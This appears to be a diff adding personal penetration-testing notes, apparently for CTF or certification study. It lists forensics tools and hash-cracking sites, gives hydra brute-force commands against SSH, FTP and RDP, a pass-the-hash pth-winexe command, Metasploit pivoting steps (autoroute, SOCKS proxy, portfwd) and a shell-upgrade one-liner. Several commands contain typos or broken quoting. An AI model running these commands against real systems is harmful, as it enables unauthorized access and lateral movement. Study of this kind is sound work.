@@ -1,0 +1,122 @@
+PDF VIEWER:
+	pdf-parser EXAMPLE.PDF
+
+NICE TO USE FIRST:
+	exif
+	strings
+	binwalk
+
+Steganography:
+	steghide xtract -sf image.jpg
+
+What is this file:
+	file $file_name
+
+
+Hash cracking sites:
+	hashkiller.co.uk
+	crackstation.net
+	md5db.net/decrypt
+
+Passing the hash CMD session:
+export SMBHASH=$YOUR_HASH_VALUE-lm-ve-ntlm
+pth-winexe -U domainname/administrator%$YOUR_HASH_vALUE // $host cmd
+
+Online Password Cracking:
+	SSH:
+		hydra -l root -P passwords.txt $VICTIM_IP ssh
+		hydra -L user.txt -P pass.txt -t 4 ssh://$VICTIM_IP:22
+	FTP:
+		hydra -l root -P passwords.txt $VICTIM_IP ftp
+
+	RDP:
+		hydra -t 1 -V -f -l adminstrator -P passwords.txt rdp://$VICTIM_IP
+
+Linux writable dir's:
+	/tmp/
+	/var/tmp/
+	/var/mail
+	/var/spool/mail
+
+
+Pivoting
+--------
+
+autoroute ---> get route informations
+in meterpreter:
+	run autoroute -h [help]
+	run autoroute -s 10.1.0.0/24
+	run autoroute -p [print already setted routing table]
+	
+	This is available for current session.
+	After this we check the network for up services.
+
+	run arp_scanner [help]
+	run arp_scanner -r 10.1.0.0/24
+
+	We have two choices after these
+	1-)A proxy that can be usable for metasploit or like nmap
+	   and a port that can run on local server for target subnet to
+	   access.
+	2-) With modules that auxiliary/scanner/portscan/tcp,
+	scanning TCP Ports in new subnet.
+
+
+	First method
+	-----------
+
+	meterpreter> background
+	msfconsole> sessions -l [active sessions]
+	msfconsole> route add 10.1.0.0 255.255.255.0 1
+	msfconsole> route print [ print the upper route]
+	msfconsole> use auixliary/server/socks4a
+	msfconsole> show options [see the all options that in use]
+	msfconsole> run
+
+	With this proxy, we have to run proxychains program.
+	(config file is in /etc/proxychains.conf )
+	The port number 9050 in the default line
+	"Socks4 127.0.0.1 9050" should be changed to 1080
+	(because the port number of the SOCKS proxy launched from 
+	Metasploit is specified in the options in 1080)
+
+	proxychains nmap -sT -Pn 10.1.0.X
+	-Proxy cannot carry the ICMP ping
+	-So -Pn is important to carry with only TCP.
+
+	Second method
+	------------
+
+	TCP SERVICE SCANNER
+	
+	msfconsole> use auxiliary/scanner/portscan/tcp
+	msfconsole> show options [ check ]
+	msfconsole> set ports 1-65535
+	msfconsole> set rhosts 10.1.0.X (upper X)
+	msfconsole> run
+
+	If you want to connect any services (LIKE HTTP)
+	you can use portfdw
+	
+	msfcnsole> sessions -i X [ X that your current victim ]
+	meterpreter> portfwd -h [ to get help ]
+	meterpreter> portfwd add -l 8000 -p 80 (HTTP EXAMPLE) -r 10.1.0.X(upper x)
+	
+	actually now, you can use the http services with localhost:8000
+
+
+Others	
+------
+	set AUTORUNSCRIPT post/windows/manage/migrate
+	IF you loose your connection after minutes you can use that script.
+
+	msfvenom help commands
+	---------------------
+	msfvenom -l payloads
+	msfvenom -l encoders
+	msfvenom --help-formats
+
+if you want to your shell to more interactive you can use this.
+	
+	python -c "import pty;pty.spawn("/bin/bash");"
+
